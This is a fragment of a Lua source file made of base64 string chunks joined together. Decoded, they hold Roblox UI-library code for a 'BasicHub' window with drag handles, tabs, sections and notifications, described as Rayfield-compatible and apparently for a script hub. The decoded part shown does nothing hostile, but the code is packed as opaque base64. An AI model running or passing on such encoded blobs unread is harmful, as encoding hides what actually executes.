+.."dmljZS5JbnB1dEJlZ2FuOkNvbm5lY3QoZnVuY3Rpb24oaW5wLCBncCkKICAgICAgICBpZiBncCB0aGVuIHJldHVybiBlbmQKICAg
+.."ICAgICBpZiBpbnAuS2V5Q29kZSA9PSBFbnVtLktleUNvZGUuSyB0aGVuCiAgICAgICAgICAgIHdpblZpc2libGUgICAgICAgID0g
+.."bm90IHdpblZpc2libGUKICAgICAgICAgICAgTWFpbkZyYW1lLlZpc2libGUgPSB3aW5WaXNpYmxlCiAgICAgICAgZW5kCiAgICBl
+.."bmQpCgogICAgLS0gQm90dG9tIGRyYWcgaGFuZGxlICAoUmF5ZmllbGQtc3R5bGUsIEZyYW1lIHNvIElucHV0QmVnYW4gcHJvcGFn
+.."YXRlcyBjbGVhbmx5KQogICAgbG9jYWwgQm90dG9tQmFyID0gSW5zdGFuY2UubmV3KCJGcmFtZSIsIE1haW5GcmFtZSkKICAgIEJv
+.."dHRvbUJhci5OYW1lICAgICAgICAgICAgID0gIkJvdHRvbURyYWdCYXIiCiAgICBCb3R0b21CYXIuU2l6ZSAgICAgICAgICAgICA9
+.."IFVEaW0yLm5ldygwLCA5MCwgMCwgMTgpCiAgICBCb3R0b21CYXIuUG9zaXRpb24gICAgICAgICA9IFVEaW0yLm5ldygwLjUsIC00
+.."NSwgMSwgLTIyKQogICAgQm90dG9tQmFyLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigwLCAyMDAsIDI1NSkKICAg
+.."IEJvdHRvbUJhci5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMC41CiAgICBCb3R0b21CYXIuQm9yZGVyU2l6ZVBpeGVsICA9IDAK
+.."ICAgIEJvdHRvbUJhci5aSW5kZXggICAgICAgICAgID0gOAogICAgSW5zdGFuY2UubmV3KCJVSUNvcm5lciIsIEJvdHRvbUJhciku
+.."Q29ybmVyUmFkaXVzID0gVURpbS5uZXcoMSwgMCkKICAgIC0tIEdyaXAgZG90cwogICAgZm9yIGkgPSAxLCAzIGRvCiAgICAgICAg
+.."bG9jYWwgZG90ID0gSW5zdGFuY2UubmV3KCJGcmFtZSIsIEJvdHRvbUJhcikKICAgICAgICBkb3QuU2l6ZSAgICAgICAgICAgICA9
+.."IFVEaW0yLm5ldygwLCA0LCAwLCA0KQogICAgICAgIGRvdC5Qb3NpdGlvbiAgICAgICAgID0gVURpbTIubmV3KDAuNSwgKGkgLSAy
+.."KSAqIDEwIC0gMiwgMC41LCAtMikKICAgICAgICBkb3QuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1
+.."LCAyNTUpCiAgICAgICAgZG90LkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAwLjMKICAgICAgICBkb3QuQm9yZGVyU2l6ZVBpeGVs
+.."ICA9IDAKICAgICAgICBkb3QuWkluZGV4ICAgICAgICAgICA9IDkKICAgICAgICBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIiwgZG90
+.."KS5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygxLCAwKQogICAgZW5kCgogICAgLS0gUmF5ZmllbGQtc3R5bGUgZHJhZyBvbiBCb3R0
+.."b21CYXIKICAgIGxvY2FsIGJUb2dnbGUsIGJJbnB1dCwgYlN0YXJ0LCBiU3RhcnRQb3MgPSBmYWxzZSwgbmlsLCBuaWwsIG5pbAog
+.."ICAgbG9jYWwgZnVuY3Rpb24gYXBwbHlCRHJhZyhpbnB1dCkKICAgICAgICBsb2NhbCBkZWx0YSA9IGlucHV0LlBvc2l0aW9uIC0g
+.."YlN0YXJ0CiAgICAgICAgVHdlZW5TZXJ2aWNlOkNyZWF0ZShNYWluRnJhbWUsIFR3ZWVuSW5mby5uZXcoMC4wMjUpLCB7CiAgICAg
+.."ICAgICAgIFBvc2l0aW9uID0gVURpbTIubmV3KAogICAgICAgICAgICAgICAgYlN0YXJ0UG9zLlguU2NhbGUsIGJTdGFydFBvcy5Y
+.."Lk9mZnNldCArIGRlbHRhLlgsCiAgICAgICAgICAgICAgICBiU3RhcnRQb3MuWS5TY2FsZSwgYlN0YXJ0UG9zLlkuT2Zmc2V0ICsg
+.."ZGVsdGEuWQogICAgICAgICAgICApLAogICAgICAgIH0pOlBsYXkoKQogICAgZW5kCiAgICBCb3R0b21CYXIuSW5wdXRCZWdhbjpD
+.."b25uZWN0KGZ1bmN0aW9uKGlucHV0KQogICAgICAgIGlmIChpbnB1dC5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlw
+.."ZS5Nb3VzZUJ1dHRvbjEgb3IKICAgICAgICAgICAgaW5wdXQuVXNlcklucHV0VHlwZSA9PSBFbnVtLlVzZXJJbnB1dFR5cGUuVG91
+.."Y2gpIGFuZAogICAgICAgICAgICBVc2VySW5wdXRTZXJ2aWNlOkdldEZvY3VzZWRUZXh0Qm94KCkgPT0gbmlsIHRoZW4KICAgICAg
+.."ICAgICAgYlRvZ2dsZSAgID0gdHJ1ZQogICAgICAgICAgICBiU3RhcnQgICAgPSBpbnB1dC5Qb3NpdGlvbgogICAgICAgICAgICBi
+.."U3RhcnRQb3MgPSBNYWluRnJhbWUuUG9zaXRpb24KICAgICAgICAgICAgaW5wdXQuQ2hhbmdlZDpDb25uZWN0KGZ1bmN0aW9uKCkK
+.."ICAgICAgICAgICAgICAgIGlmIGlucHV0LlVzZXJJbnB1dFN0YXRlID09IEVudW0uVXNlcklucHV0U3RhdGUuRW5kIHRoZW4KICAg
+.."ICAgICAgICAgICAgICAgICBiVG9nZ2xlID0gZmFsc2UKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpCiAgICAg
+.."ICAgZW5kCiAgICBlbmQpCiAgICBCb3R0b21CYXIuSW5wdXRDaGFuZ2VkOkNvbm5lY3QoZnVuY3Rpb24oaW5wdXQpCiAgICAgICAg
+.."aWYgaW5wdXQuVXNlcklucHV0VHlwZSA9PSBFbnVtLlVzZXJJbnB1dFR5cGUuTW91c2VNb3ZlbWVudCBvcgogICAgICAgICAgIGlu
+.."cHV0LlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5wdXRUeXBlLlRvdWNoIHRoZW4KICAgICAgICAgICAgYklucHV0ID0gaW5w
+.."dXQKICAgICAgICBlbmQKICAgIGVuZCkKICAgIFVzZXJJbnB1dFNlcnZpY2UuSW5wdXRDaGFuZ2VkOkNvbm5lY3QoZnVuY3Rpb24o
+.."aW5wdXQpCiAgICAgICAgaWYgaW5wdXQgPT0gYklucHV0IGFuZCBiVG9nZ2xlIHRoZW4KICAgICAgICAgICAgYXBwbHlCRHJhZyhp
+.."bnB1dCkKICAgICAgICBlbmQKICAgIGVuZCkKCiAgICAtLSBTaWRlYmFyCiAgICBsb2NhbCBTaWRlYmFyID0gSW5zdGFuY2UubmV3
+.."KCJGcmFtZSIsIE1haW5GcmFtZSkKICAgIFNpZGViYXIuU2l6ZSAgICAgICAgICAgICA9IFVEaW0yLm5ldygwLCBTSURFQkFSX1cs
+.."IDEsIC1UT1BCQVJfSCkKICAgIFNpZGViYXIuUG9zaXRpb24gICAgICAgICA9IFVEaW0yLm5ldygwLCAwLCAwLCBUT1BCQVJfSCkK
+.."ICAgIFNpZGViYXIuQmFja2dyb3VuZENvbG9yMyA9IENfU0lERV9CRwogICAgU2lkZWJhci5Cb3JkZXJTaXplUGl4ZWwgID0gMAog
+.."ICAgSW5zdGFuY2UubmV3KCJVSUNvcm5lciIsIFNpZGViYXIpLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDEwKQogICAgbG9j
+.."YWwgc2lkZVBhdGNoID0gSW5zdGFuY2UubmV3KCJGcmFtZSIsIFNpZGViYXIpCiAgICBzaWRlUGF0Y2guU2l6ZSAgICAgICAgICAg
+.."ICA9IFVEaW0yLm5ldygwLjUsIDAsIDEsIDApCiAgICBzaWRlUGF0Y2guUG9zaXRpb24gICAgICAgICA9IFVEaW0yLm5ldygwLjUs
+.."IDAsIDAsIDApCiAgICBzaWRlUGF0Y2guQmFja2dyb3VuZENvbG9yMyA9IENfU0lERV9CRwogICAgc2lkZVBhdGNoLkJvcmRlclNp
+.."emVQaXhlbCAgPSAwCgogICAgbG9jYWwgVGFiTGlzdCA9IEluc3RhbmNlLm5ldygiU2Nyb2xsaW5nRnJhbWUiLCBTaWRlYmFyKQog
+.."ICAgVGFiTGlzdC5TaXplICAgICAgICAgICAgICAgICAgID0gVURpbTIubmV3KDEsIC00LCAxLCAtOCkKICAgIFRhYkxpc3QuUG9z
+.."aXRpb24gICAgICAgICAgICAgICA9IFVEaW0yLm5ldygwLCAyLCAwLCA4KQogICAgVGFiTGlzdC5CYWNrZ3JvdW5kVHJhbnNwYXJl
+.."bmN5ID0gMQogICAgVGFiTGlzdC5Cb3JkZXJTaXplUGl4ZWwgICAgICAgID0gMAogICAgVGFiTGlzdC5TY3JvbGxCYXJUaGlja25l
+.."c3MgICAgID0gMAogICAgVGFiTGlzdC5DYW52YXNTaXplICAgICAgICAgICAgID0gVURpbTIubmV3KDAsIDAsIDAsIDApCiAgICBs
+.."b2NhbCBUYWJMYXlvdXQgPSBJbnN0YW5jZS5uZXcoIlVJTGlzdExheW91dCIsIFRhYkxpc3QpCiAgICBUYWJMYXlvdXQuUGFkZGlu
+.."ZyAgID0gVURpbS5uZXcoMCwgMikKICAgIFRhYkxheW91dC5Tb3J0T3JkZXIgPSBFbnVtLlNvcnRPcmRlci5MYXlvdXRPcmRlcgog
+.."ICAgVGFiTGF5b3V0OkdldFByb3BlcnR5Q2hhbmdlZFNpZ25hbCgiQWJzb2x1dGVDb250ZW50U2l6ZSIpOkNvbm5lY3QoZnVuY3Rp
+.."b24oKQogICAgICAgIFRhYkxpc3QuQ2FudmFzU2l6ZSA9IFVEaW0yLm5ldygwLCAwLCAwLCBUYWJMYXlvdXQuQWJzb2x1dGVDb250
+.."ZW50U2l6ZS5ZICsgOCkKICAgIGVuZCkKCiAgICAtLSBDb250ZW50IGFyZWEKICAgIGxvY2FsIENvbnRlbnQgPSBJbnN0YW5jZS5u
+.."ZXcoIkZyYW1lIiwgTWFpbkZyYW1lKQogICAgQ29udGVudC5TaXplICAgICAgICAgICAgID0gVURpbTIubmV3KDEsIC1TSURFQkFS
+.."X1csIDEsIC1UT1BCQVJfSCkKICAgIENvbnRlbnQuUG9zaXRpb24gICAgICAgICA9IFVEaW0yLm5ldygwLCBTSURFQkFSX1csIDAs
+.."IFRPUEJBUl9IKQogICAgQ29udGVudC5CYWNrZ3JvdW5kQ29sb3IzID0gQ19DT05UX0JHCiAgICBDb250ZW50LkJvcmRlclNpemVQ
+.."aXhlbCAgPSAwCiAgICBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIiwgQ29udGVudCkuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwg
+.."MTApCiAgICBsb2NhbCBjb250UGF0Y2ggPSBJbnN0YW5jZS5uZXcoIkZyYW1lIiwgQ29udGVudCkKICAgIGNvbnRQYXRjaC5TaXpl
+.."ICAgICAgICAgICAgID0gVURpbTIubmV3KDAuMTUsIDAsIDEsIDApCiAgICBjb250UGF0Y2guQmFja2dyb3VuZENvbG9yMyA9IENf
+.."Q09OVF9CRwogICAgY29udFBhdGNoLkJvcmRlclNpemVQaXhlbCAgPSAwCgogICAgLS0gTm90aWZpY2F0aW9uIGNvbnRhaW5lciAo
+.."Ym90dG9tLXJpZ2h0IG9mIHNjcmVlbikKICAgIGxvY2FsIE5vdGlmRnJhbWUgPSBJbnN0YW5jZS5uZXcoIkZyYW1lIiwgZ3VpUm9v
+.."dCkKICAgIE5vdGlmRnJhbWUuTmFtZSAgICAgICAgICAgICAgICAgICA9ICJOb3RpZmljYXRpb25zIgogICAgTm90aWZGcmFtZS5T
+.."aXplICAgICAgICAgICAgICAgICAgID0gVURpbTIubmV3KDAsIDI3OCwgMSwgMCkKICAgIE5vdGlmRnJhbWUuUG9zaXRpb24gICAg
+.."ICAgICAgICAgICA9IFVEaW0yLm5ldygxLCAtMjg4LCAwLCAwKQogICAgTm90aWZGcmFtZS5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5
+.."ID0gMQogICAgTm90aWZGcmFtZS5Cb3JkZXJTaXplUGl4ZWwgICAgICAgID0gMAogICAgbG9jYWwgTm90aWZMYXlvdXQgPSBJbnN0
+.."YW5jZS5uZXcoIlVJTGlzdExheW91dCIsIE5vdGlmRnJhbWUpCiAgICBOb3RpZkxheW91dC5QYWRkaW5nICAgICAgICAgICA9IFVE
+.."aW0ubmV3KDAsIDYpCiAgICBOb3RpZkxheW91dC5WZXJ0aWNhbEFsaWdubWVudCA9IEVudW0uVmVydGljYWxBbGlnbm1lbnQuQm90
+.."dG9tCiAgICBOb3RpZkxheW91dC5Tb3J0T3JkZXIgICAgICAgICA9IEVudW0uU29ydE9yZGVyLkxheW91dE9yZGVyCgogICAgLS0g
+.."4pSA4pSAIFNoYXJlZCBoZWxwZXJzIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
+.."gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
+.."gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAogICAgbG9jYWwgZnVuY3Rpb24gbWFrZVNjcm9sbCgpCiAg
+.."ICAgICAgbG9jYWwgc2YgPSBJbnN0YW5jZS5uZXcoIlNjcm9sbGluZ0ZyYW1lIiwgQ29udGVudCkKICAgICAgICBzZi5TaXplICAg
+.."ICAgICAgICAgICAgICAgID0gVURpbTIubmV3KDEsIC02LCAxLCAtNikKICAgICAgICBzZi5Qb3NpdGlvbiAgICAgICAgICAgICAg
+.."ID0gVURpbTIubmV3KDAsIDMsIDAsIDMpCiAgICAgICAgc2YuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgICAgICBzZi5C
+.."b3JkZXJTaXplUGl4ZWwgICAgICAgID0gMAogICAgICAgIHNmLlNjcm9sbEJhclRoaWNrbmVzcyAgICAgPSAzCiAgICAgICAgc2Yu
+.."U2Nyb2xsQmFySW1hZ2VDb2xvcjMgICA9IENvbG9yMy5mcm9tUkdCKDcwLCA3MCwgOTApCiAgICAgICAgc2YuQ2FudmFzU2l6ZSAg
+.."ICAgICAgICAgICA9IFVEaW0yLm5ldygwLCAwLCAwLCAwKQogICAgICAgIHNmLlZpc2libGUgICAgICAgICAgICAgICAgPSBmYWxz
+.."ZQogICAgICAgIGxvY2FsIGxheW91dCA9IEluc3RhbmNlLm5ldygiVUlMaXN0TGF5b3V0Iiwgc2YpCiAgICAgICAgbGF5b3V0LlBh
+.."ZGRpbmcgICA9IFVEaW0ubmV3KDAsIDQpCiAgICAgICAgbGF5b3V0LlNvcnRPcmRlciA9IEVudW0uU29ydE9yZGVyLkxheW91dE9y
+.."ZGVyCiAgICAgICAgbG9jYWwgcGFkID0gSW5zdGFuY2UubmV3KCJVSVBhZGRpbmciLCBzZikKICAgICAgICBwYWQuUGFkZGluZ0xl
+.."ZnQgICA9IFVEaW0ubmV3KDAsIDgpCiAgICAgICAgcGFkLlBhZGRpbmdSaWdodCAgPSBVRGltLm5ldygwLCA4KQogICAgICAgIHBh
+.."ZC5QYWRkaW5nVG9wICAgID0gVURpbS5uZXcoMCwgNikKICAgICAgICBwYWQuUGFkZGluZ0JvdHRvbSA9IFVEaW0ubmV3KDAsIDYp
+.."CiAgICAgICAgbGF5b3V0OkdldFByb3BlcnR5Q2hhbmdlZFNpZ25hbCgiQWJzb2x1dGVDb250ZW50U2l6ZSIpOkNvbm5lY3QoZnVu
+.."Y3Rpb24oKQogICAgICAgICAgICBzZi5DYW52YXNTaXplID0gVURpbTIubmV3KDAsIDAsIDAsIGxheW91dC5BYnNvbHV0ZUNvbnRl
+.."bnRTaXplLlkgKyAxNCkKICAgICAgICBlbmQpCiAgICAgICAgcmV0dXJuIHNmLCBsYXlvdXQKICAgIGVuZAoKICAgIGxvY2FsIGZ1
+.."bmN0aW9uIG1ha2VFbGVtKHBhcmVudCwgaCkKICAgICAgICBsb2NhbCBmID0gSW5zdGFuY2UubmV3KCJGcmFtZSIsIHBhcmVudCkK
+.."ICAgICAgICBmLlNpemUgICAgICAgICAgICAgPSBVRGltMi5uZXcoMSwgMCwgMCwgaCBvciAzNCkKICAgICAgICBmLkJhY2tncm91
+.."bmRDb2xvcjMgPSBDX0VMRU1fQkcKICAgICAgICBmLkJvcmRlclNpemVQaXhlbCAgPSAwCiAgICAgICAgSW5zdGFuY2UubmV3KCJV
+.."SUNvcm5lciIsIGYpLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDYpCiAgICAgICAgcmV0dXJuIGYKICAgIGVuZAoKICAgIC0t
+.."IOKUgOKUgCBSYXlmaWVsZC1jb21wYXRpYmxlIEFQSSDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
+.."lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
+.."lIDilIDilIDilIDilIDilIDilIDilIAKICAgIGZ1bmN0aW9uIGxpYjpDcmVhdGVXaW5kb3cob3B0cykKICAgICAgICBvcHRzID0g
+.."b3B0cyBvciB7fQogICAgICAgIFRpdGxlTGJsLlRleHQgPSBvcHRzLk5hbWUgb3IgIkJhc2ljSHViIgoKICAgICAgICBsb2NhbCBh
+.."Y3RpdmVTY3JvbGwgPSBuaWwKICAgICAgICBsb2NhbCBhY3RpdmVUYWJCdG4gPSBuaWwKCiAgICAgICAgbG9jYWwgZnVuY3Rpb24g
+.."c2hvd1RhYihzZiwgYnRuKQogICAgICAgICAgICBpZiBhY3RpdmVTY3JvbGwgdGhlbiBhY3RpdmVTY3JvbGwuVmlzaWJsZSA9IGZh
+.."bHNlIGVuZAogICAgICAgICAgICBpZiBhY3RpdmVUYWJCdG4gdGhlbgogICAgICAgICAgICAgICAgYWN0aXZlVGFiQnRuLkJhY2tn
+.."cm91bmRDb2xvcjMgPSBDX1NJREVfQkcKICAgICAgICAgICAgICAgIGxvY2FsIGwgPSBhY3RpdmVUYWJCdG46RmluZEZpcnN0Q2hp
+.."bGRPZkNsYXNzKCJUZXh0TGFiZWwiKQogICAgICAgICAgICAgICAgaWYgbCB0aGVuIGwuVGV4dENvbG9yMyA9IENfU1VCIGVuZAog
+.."ICAgICAgICAgICBlbmQKICAgICAgICAgICAgc2YuVmlzaWJsZSAgICAgICAgICAgICA9IHRydWUKICAgICAgICAgICAgYnRuLkJh
+.."Y2tncm91bmRDb2xvcjMgICA9IENvbG9yMy5mcm9tUkdCKDMwLCAzMCwgNDQpCiAgICAgICAgICAgIGxvY2FsIGwgPSBidG46Rmlu
+.."ZEZpcnN0Q2hpbGRPZkNsYXNzKCJUZXh0TGFiZWwiKQogICAgICAgICAgICBpZiBsIHRoZW4gbC5UZXh0Q29sb3IzID0gQ19BQ0NF
+.."TlQgZW5kCiAgICAgICAgICAgIGFjdGl2ZVNjcm9sbCA9IHNmCiAgICAgICAgICAgIGFjdGl2ZVRhYkJ0biA9IGJ0bgogICAgICAg
+.."IGVuZAoKICAgICAgICBsb2NhbCB3aW4gICAgICA9IHt9CiAgICAgICAgbG9jYWwgdGFiQ291bnQgPSAwCgogICAgICAgIGZ1bmN0
+.."aW9uIHdpbjpDcmVhdGVUYWIobmFtZSwgX2ljb24pCiAgICAgICAgICAgIHRhYkNvdW50ID0gdGFiQ291bnQgKyAxCiAgICAgICAg
+.."ICAgIGxvY2FsIHNjcm9sbCwgX2xheW91dCA9IG1ha2VTY3JvbGwoKQogICAgICAgICAgICBsb2NhbCBlbGVtT3JkZXIgPSAwCiAg
+.."ICAgICAgICAgIGxvY2FsIGZ1bmN0aW9uIG5leHRPcmRlcigpCiAgICAgICAgICAgICAgICBlbGVtT3JkZXIgPSBlbGVtT3JkZXIg
+.."KyAxCiAgICAgICAgICAgICAgICByZXR1cm4gZWxlbU9yZGVyCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgLS0gU2lkZWJh
+.."ciBidXR0b24KICAgICAgICAgICAgbG9jYWwgdGFiQnRuID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIiwgVGFiTGlzdCkKICAg
+.."ICAgICAgICAgdGFiQnRuLlNpemUgICAgICAgICAgICAgPSBVRGltMi5uZXcoMSwgLTQsIDAsIDMwKQogICAgICAgICAgICB0YWJC
+.."dG4uQmFja2dyb3VuZENvbG9yMyA9IENfU0lERV9CRwogICAgICAgICAgICB0YWJCdG4uQm9yZGVyU2l6ZVBpeGVsICA9IDAKICAg
+.."ICAgICAgICAgdGFiQnRuLlRleHQgICAgICAgICAgICAgPSAiIgogICAgICAgICAgICB0YWJCdG4uTGF5b3V0T3JkZXIgICAgICA9
+.."IHRhYkNvdW50CiAgICAgICAgICAgIEluc3RhbmNlLm5ldygiVUlDb3JuZXIiLCB0YWJCdG4pLkNvcm5lclJhZGl1cyA9IFVEaW0u
+.."bmV3KDAsIDYpCgogICAgICAgICAgICBsb2NhbCB0YWJMYmwgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIsIHRhYkJ0bikKICAg
+.."ICAgICAgICAgdGFiTGJsLlNpemUgICAgICAgICAgICAgICAgICAgPSBVRGltMi5uZXcoMSwgLTEwLCAxLCAwKQogICAgICAgICAg
+.."ICB0YWJMYmwuUG9zaXRpb24gICAgICAgICAgICAgICA9IFVEaW0yLm5ldygwLCA4LCAwLCAwKQogICAgICAgICAgICB0YWJMYmwu
+.."QmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgICAgICAgICAgdGFiTGJsLlRleHQgICAgICAgICAgICAgICAgICAgPSBuYW1l
+.."CiAgICAgICAgICAgIHRhYkxibC5UZXh0Q29sb3IzICAgICAgICAgICAgID0gQ19TVUIKICAgICAgICAgICAgdGFiTGJsLkZvbnQg
+.."ICAgICAgICAgICAgICAgICAgPSBFbnVtLkZvbnQuR290aGFtCiAgICAgICAgICAgIHRhYkxibC5UZXh0U2l6ZSAgICAgICAgICAg
+.."ICAgID0gMTEKICAgICAgICAgICAgdGFiTGJsLlRleHRYQWxpZ25tZW50ICAgICAgICAgPSBFbnVtLlRleHRYQWxpZ25tZW50Lkxl
+.."ZnQKCiAgICAgICAgICAgIHRhYkJ0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkgc2hvd1RhYihzY3JvbGws
+.."IHRhYkJ0bikgZW5kKQogICAgICAgICAgICB0YWJCdG4uTW91c2VFbnRlcjpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAg
+.."ICAgIGlmIHRhYkJ0biB+PSBhY3RpdmVUYWJCdG4gdGhlbgogICAgICAgICAgICAgICAgICAgIHRhYkJ0bi5CYWNrZ3JvdW5kQ29s
+.."b3IzID0gQ29sb3IzLmZyb21SR0IoMjIsIDIyLCAzMikKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpCiAgICAg
+.."ICAgICAgIHRhYkJ0bi5Nb3VzZUxlYXZlOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgaWYgdGFiQnRuIH49IGFj
+.."dGl2ZVRhYkJ0biB0aGVuCiAgICAgICAgICAgICAgICAgICAgdGFiQnRuLkJhY2tncm91bmRDb2xvcjMgPSBDX1NJREVfQkcKICAg
+.."ICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpCgogICAgICAgICAgICBpZiB0YWJDb3VudCA9PSAxIHRoZW4gc2hvd1Rh
+.."YihzY3JvbGwsIHRhYkJ0bikgZW5kCgogICAgICAgICAgICBsb2NhbCB0YWIgPSB7fQoKICAgICAgICAgICAgZnVuY3Rpb24gdGFi
+.."OkNyZWF0ZVNlY3Rpb24odGl0bGUpCiAgICAgICAgICAgICAgICBsb2NhbCBmID0gSW5zdGFuY2UubmV3KCJGcmFtZSIsIHNjcm9s
+.."bCkKICAgICAgICAgICAgICAgIGYuU2l6ZSAgICAgICAgICAgICAgICAgICA9IFVEaW0yLm5ldygxLCAwLCAwLCAyMCkKICAgICAg
+.."ICAgICAgICAgIGYuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgICAgICAgICAgICAgIGYuTGF5b3V0T3JkZXIgICAgICAg
+.."ICAgICA9IG5leHRPcmRlcigpCiAgICAgICAgICAgICAgICBsb2NhbCBsYmwgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIsIGYp
+.."CiAgICAgICAgICAgICAgICBsYmwuU2l6ZSAgICAgICAgICAgICAgICAgICA9IFVEaW0yLm5ldygxLCAtOCwgMSwgMCkKICAgICAg
+.."ICAgICAgICAgIGxibC5Qb3NpdGlvbiAgICAgICAgICAgICAgID0gVURpbTIubmV3KDAsIDQsIDAsIDApCiAgICAgICAgICAgICAg
+.."ICBsYmwuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgICAgICAgICAgICAgIGxibC5UZXh0ICAgICAgICAgICAgICAgICAg
+.."ID0gdGl0bGU6dXBwZXIoKQogICAgICAgICAgICAgICAgbGJsLlRleHRDb2xvcjMgICAgICAgICAgICAgPSBDX0FDQ0VOVAogICAg
+.."ICAgICAgICAgICAgbGJsLkZvbnQgICAgICAgICAgICAgICAgICAgPSBFbnVtLkZvbnQuR290aGFtQm9sZAogICAgICAgICAgICAg
+.."ICAgbGJsLlRleHRTaXplICAgICAgICAgICAgICAgPSAxMAogICAgICAgICAgICAgICAgbGJsLlRleHRYQWxpZ25tZW50ICAgICAg
+.."ICAgPSBFbnVtLlRleHRYQWxpZ25tZW50LkxlZnQKICAgICAgICAgICAgICAgIGxvY2FsIGxpbmUgPSBJbnN0YW5jZS5uZXcoIkZy
+.."YW1lIiwgZikKICAgICAgICAgICAgICAgIGxpbmUuU2l6ZSAgICAgICAgICAgICA9IFVEaW0yLm5ldygxLCAwLCAwLCAxKQogICAg
+.."ICAgICAgICAgICAgbGluZS5Qb3NpdGlvbiAgICAgICAgID0gVURpbTIubmV3KDAsIDAsIDEsIC0xKQogICAgICAgICAgICAgICAg
+.."bGluZS5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoNDUsIDQ1LCA2MCkKICAgICAgICAgICAgICAgIGxpbmUuQm9y
+.."ZGVyU2l6ZVBpeGVsICA9IDAKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBmdW5jdGlvbiB0YWI6Q3JlYXRlRGl2aWRlcigp
+.."CiAgICAgICAgICAgICAgICBsb2NhbCBmID0gSW5zdGFuY2UubmV3KCJGcmFtZSIsIHNjcm9sbCkKICAgICAgICAgICAgICAgIGYu
+.."U2l6ZSAgICAgICAgICAgICAgICAgICA9IFVEaW0yLm5ldygxLCAwLCAwLCA4KQogICAgICAgICAgICAgICAgZi5CYWNrZ3JvdW5k
+.."VHJhbnNwYXJlbmN5ID0gMQogICAgICAgICAgICAgICAgZi5MYXlvdXRPcmRlciAgICAgICAgICAgID0gbmV4dE9yZGVyKCkKICAg
+.."ICAgICAgICAgICAgIGxvY2FsIGxpbmUgPSBJbnN0YW5jZS5uZXcoIkZyYW1lIiwgZikKICAgICAgICAgICAgICAgIGxpbmUuU2l6
+.."ZSAgICAgICAgICAgICA9IFVEaW0yLm5ldygxLCAwLCAwLCAxKQogICAgICAgICAgICAgICAgbGluZS5Qb3NpdGlvbiAgICAgICAg
+.."ID0gVURpbTIubmV3KDAsIDAsIDAuNSwgMCkKICAgICAgICAgICAgICAgIGxpbmUuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5m
+.."cm9tUkdCKDQwLCA0MCwgNTUpCiAgICAgICAgICAgICAgICBsaW5lLkJvcmRlclNpemVQaXhlbCAgPSAwCiAgICAgICAgICAgIGVu
+.."ZAoKICAgICAgICAgICAgZnVuY3Rpb24gdGFiOkNyZWF0ZUxhYmVsKHRleHQpCiAgICAgICAgICAgICAgICBsb2NhbCBmID0gbWFr
+.."ZUVsZW0oc2Nyb2xsLCAyNikKICAgICAgICAgICAgICAgIGYuTGF5b3V0T3JkZXIgICAgICAgICAgICA9IG5leHRPcmRlcigpCiAg
+.."ICAgICAgICAgICAgICBmLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAwLjU1CiAgICAgICAgICAgICAgICBsb2NhbCBsYmwgPSBJ
+.."bnN0YW5jZS5uZXcoIlRleHRMYWJlbCIsIGYpCiAgICAgICAgICAgICAgICBsYmwuU2l6ZSAgICAgICAgICAgICAgICAgICA9IFVE
+.."aW0yLm5ldygxLCAtMTAsIDEsIDApCiAgICAgICAgICAgICAgICBsYmwuUG9zaXRpb24gICAgICAgICAgICAgICA9IFVEaW0yLm5l
+.."dygwLCA2LCAwLCAwKQogICAgICAgICAgICAgICAgbGJsLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgICAgICAg
+.."ICBsYmwuVGV4dCAgICAgICAgICAgICAgICAgICA9IHRleHQKICAgICAgICAgICAgICAgIGxibC5UZXh0Q29sb3IzICAgICAgICAg
+.."ICAgID0gQ19TVUIKICAgICAgICAgICAgICAgIGxibC5Gb250ICAgICAgICAgICAgICAgICAgID0gRW51bS5Gb250LkdvdGhhbQog
